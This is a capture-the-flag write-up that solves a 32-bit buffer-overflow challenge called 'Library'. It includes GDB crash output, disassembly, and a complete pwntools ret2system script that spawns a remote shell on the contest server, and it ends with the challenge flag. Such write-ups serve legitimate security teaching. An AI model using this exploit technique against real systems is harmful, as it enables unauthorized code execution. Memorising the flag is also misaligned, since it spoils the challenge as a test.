# Pwn 300 - Library

We are given a nc server, ```nc 40.76.33.15 41141```, and a 32 bit binary. 

Here is the pseudocode:
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  system("echo 'Good luck on your final pwning voyage of the competition\n'");
  vuln();
  return 0;
}

char *vuln()
{
  int s; // [esp+6h] [ebp-62h]
  __int16 v2; // [esp+Ah] [ebp-5Eh]
  int v3; // [esp+5Ch] [ebp-Ch]

  puts("You have input, find an exploit that would make John Purdue proud");
  s = 0;
  v3 = 0;
  memset(
    (void *)((unsigned int)&v2 & 0xFFFFFFFC),
    0,
    4 * (((unsigned int)((char *)&s - ((unsigned int)&v2 & 0xFFFFFFFC) + 90) & 0xFFFFFFFC) >> 2));
  return fgets((char *)&s, 150, stdin);
}
```

Again, we have an overflow in the vuln function, which we can confirm in GDB:

```
root@ctf:~# gdb library
Reading symbols from library...(no debugging symbols found)...done.
(gdb) r
Starting program: /root/library
Good luck on your final pwning voyage of the competition
 0:ssh*                                                                                                14/10  21:42:51 You have input, find an exploit that would make John Purdue proud
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333444455556666777788889999

Program received signal SIGSEGV, Segmentation fault.
0x30305a5a in ?? ()
(gdb)
```

Segmentation fault means that the program tried to access invalid memory. In this case, eip is 0x30305a5a, which is invalid memory. That's because it is ZZ00, our input.

So now we control eip, but sadly there's no print flag function. Instead, we can reuse code. Let's take a look at the assembly for main:

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804849b <+0>:     lea    0x4(%esp),%ecx
   0x0804849f <+4>:     and    $0xfffffff0,%esp
   0x080484a2 <+7>:     pushl  -0x4(%ecx)
   0x080484a5 <+10>:    push   %ebp
   0x080484a6 <+11>:    mov    %esp,%ebp
   0x080484a8 <+13>:    push   %ecx
   0x080484a9 <+14>:    sub    $0x4,%esp
   0x080484ac <+17>:    sub    $0xc,%esp
   0x080484af <+20>:    push   $0x80485c0
   0x080484b4 <+25>:    call   0x8048370 <system@plt>
   0x080484b9 <+30>:    add    $0x10,%esp
   0x080484bc <+33>:    call   0x80484ce <vuln>
   0x080484c1 <+38>:    mov    $0x0,%eax
   0x080484c6 <+43>:    mov    -0x4(%ebp),%ecx
   0x080484c9 <+46>:    leave
   0x080484ca <+47>:    lea    -0x4(%ecx),%esp
   0x080484cd <+50>:    ret
End of assembler dump.
(gdb)
```

These two lines are of interest:

```
0x080484af <+20>:    push   $0x80485c0
   0x080484b4 <+25>:    call   0x8048370 <system@plt>
   ```
   
See how in the pseudocode ```system("echo 'Good luck on your final pwning voyage of the competition\n'");``` is called? That's how you do it in assembly. The address of the string is pushed onto the stack, then the return address is pushed with the call function, then the program jumps to system.

So the stack would look like: ```<ret address> <argument>``` when system is called. We can replicate the stack to have the first argument be "/bin/sh" because we have a stack buffer overflow. The format would have to be ```<anything because we don't care about return address> <address of /bin/sh string>```.

Luckily the problem author was nice enough to include a /bin/sh string in the binary, although it is still solvable without:

```
.data:0804A024                 public g_helpful_string
.data:0804A024 g_helpful_string db '/bin/sh',0
```

So our input would have to be ```<padding> <system address> <anything> <address of binsh string>```. Here is my code to do so:

```python
from pwn import *

#r = process("./library")
r = remote("40.76.33.15", 41141)
payload = "A"*102
binsh = 0x0804A024
system = 0x8048370

payload += p32(system)
payload += "AAAA"
payload += p32(binsh)
r.sendline(payload)
r.interactive()
```

```
root@ctf:~# python solve.py
[+] Opening connection to 40.76.33.15 on port 41141: Done
[*] Switching to interactive mode
Good luck on your final pwning voyage of the competition

$ id
uid=1005(library) gid=1005(library) groups=1005(library)
$ cat home/library/flag.txt
b0ctf{b01lers_1z_pr0ud_th4t_y0u_s01v3d_th1$}
```

## Flag
### b0ctf{b01lers_1z_pr0ud_th4t_y0u_s01v3d_th1$}
